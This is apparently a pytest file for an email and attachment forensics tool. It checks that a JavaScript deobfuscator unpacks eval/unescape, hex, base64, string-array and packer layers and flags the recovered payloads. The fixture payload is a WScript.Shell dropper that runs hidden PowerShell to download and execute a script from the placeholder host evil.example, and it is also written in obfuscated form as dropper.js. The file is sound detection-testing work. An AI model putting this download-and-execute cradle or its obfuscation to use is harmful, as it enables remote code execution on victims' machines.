"""JavaScript deobfuscation cascade (pure-Python, runs before analysis)."""

from __future__ import annotations

import base64
from pathlib import Path

from docutracex import codefiles
from docutracex.parsers import javascript, js_deobf
from docutracex.storage import CasePaths

PAYLOAD = ("var sh=new ActiveXObject('WScript.Shell');"
           "sh.Run('powershell -w hidden -c iwr http://evil.example/s.ps1|iex',0);")


def _pct(s: str) -> str:
    return "".join("%%%02x" % b for b in s.encode())


def _hexesc(s: str) -> str:
    return "".join("\\x%02x" % b for b in s.encode())


# --- the reference finding ----------------------------------------------------

def test_reference_eval_unescape_is_cracked() -> None:
    # finding js_obfuscated: a huge single line of %NN / \xNN that is
    # eval(unescape(...)). The multi-pass decoder must recover the payload.
    code = 'eval(unescape("%s"));' % (_pct(PAYLOAD) * 40)  # one ~50k line
    r = js_deobf.deobfuscate(code)
    assert r["changed"]
    assert "WScript.Shell" in r["code"] and "powershell" in r["code"]
    assert "unescape/percent" in r["methods"]
    assert "unwrap-eval/Function/write" in r["methods"]


def test_reference_case_surfaces_payload_findings(tmp_path: Path) -> None:
    ex = tmp_path / "extracted"
    (ex / "att").mkdir(parents=True)
    (ex / "att" / "dropper.js").write_text('eval(unescape("%s"));' % (_pct(PAYLOAD) * 40))
    res = javascript.analyze(tmp_path / "orig.eml", ex, {})
    rules = {f["rule"] for f in res["findings"]}
    # The obfuscation is still flagged AND the recovered payload is analysed.
    assert {"js_obfuscated", "js_deobfuscated", "js_wscript_shell", "js_lolbin"} <= rules
    sc = res["scripts"][0]
    assert sc["code_is_deobfuscated"] and "WScript.Shell" in sc["code"]


# --- individual cascade stages ------------------------------------------------

def test_hex_escape_eval_is_unwrapped() -> None:
    r = js_deobf.deobfuscate('eval("%s")' % _hexesc(PAYLOAD))
    assert r["changed"] and "WScript.Shell" in r["code"]


def test_fromcharcode_and_concat_and_atob() -> None:
    inner = "sh.Run('calc')"
    b64 = base64.b64encode(inner.encode()).decode()
    code = "var a='ev'+'al'; eval(atob('%s')); String.fromCharCode(104,105);" % b64
    r = js_deobf.deobfuscate(code)
    assert "sh.Run('calc')" in r["code"]
    assert "atob/base64" in r["methods"]


def test_stacked_layers_unfold() -> None:
    # eval(unescape( eval(atob(<payload>)) ))
    inner = "sh.Run('calc.exe')"
    layer1 = 'eval(atob("%s"))' % base64.b64encode(inner.encode()).decode()
    code = 'eval(unescape("%s"))' % _pct(layer1)
    r = js_deobf.deobfuscate(code)
    assert inner in r["code"]


def test_string_array_inlining_reveals_url() -> None:
    code = ("var _0xa=['http://malware.example/x','GET'];"
            "var u=_0xa[0]; var m=_0xa[1];")
    r = js_deobf.deobfuscate(code)
    assert "http://malware.example/x" in r["code"]
    assert "string-array-inline" in r["methods"]


def test_dean_edwards_packer_is_unpacked() -> None:
    packed = (r"eval(function(p,a,c,k,e,d){e=function(c){return c.toString(a)};"
              r"if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}"
              r"k=[function(e){return d[e]}];e=function(){return'\w+'};c=1};"
              r"while(c--){if(k[c]){p=p.replace(new RegExp('\b'+e(c)+'\b','g'),k[c])}}"
              r"return p}('0 1=2;',3,3,'var|x|5'.split('|'),0,{}))")
    r = js_deobf.deobfuscate(packed)
    assert "var x=5;" in r["code"].replace(" ", " ")
    assert "dean-edwards-packer" in r["schemes"]
    assert "packer:dean-edwards" in r["methods"]


def test_schemes_detected_even_without_decode() -> None:
    assert "aaencode" in js_deobf.detect_schemes("ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ ['_']; o=(ﾟｰﾟ)")
    jsf = "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]]" * 3
    assert "jsfuck" in js_deobf.detect_schemes(jsf)


def test_clean_script_is_untouched() -> None:
    code = "function add(a, b) { return a + b; }\nconsole.log(add(1, 2));"
    r = js_deobf.deobfuscate(code)
    assert not r["changed"] and r["code"] == code and not r["methods"]


def test_no_catastrophic_backtracking_on_escape_heavy_input() -> None:
    # A long escape-heavy literal with no exec wrapper must return promptly.
    import time
    code = '"' + "\\x41" * 20000 + '"; var x = 1;'
    t0 = time.monotonic()
    r = js_deobf.deobfuscate(code)
    assert time.monotonic() - t0 < 10
    assert "AAAA" in r["code"]


# --- code dumping -------------------------------------------------------------

def test_codefiles_dumps_original_and_deobfuscated(tmp_path: Path) -> None:
    cp = CasePaths("case1", cases_dir=tmp_path)
    cp.root.mkdir(parents=True, exist_ok=True)
    full = 'eval(unescape("%s"));' % _pct(PAYLOAD)
    deob = PAYLOAD
    modules = {"javascript": {"scripts": [{
        "location": "file:att/dropper.js", "kind": "jscript/js",
        "code": deob, "code_is_deobfuscated": True,
        "_full_code": full, "_full_deob": deob,
    }]}}
    changed = codefiles.annotate(modules, cp)
    assert "javascript" in changed
    sc = modules["javascript"]["scripts"][0]
    assert (cp.root / sc["code_file"]).read_text() == full            # original
    assert (cp.root / sc["code_file_deob"]).read_text() == deob       # recovered
    assert sc["code_file_deob"].endswith(".deobfuscated.js")
    # Scratch keys never persist.
    assert "_full_code" not in sc and "_full_deob" not in sc
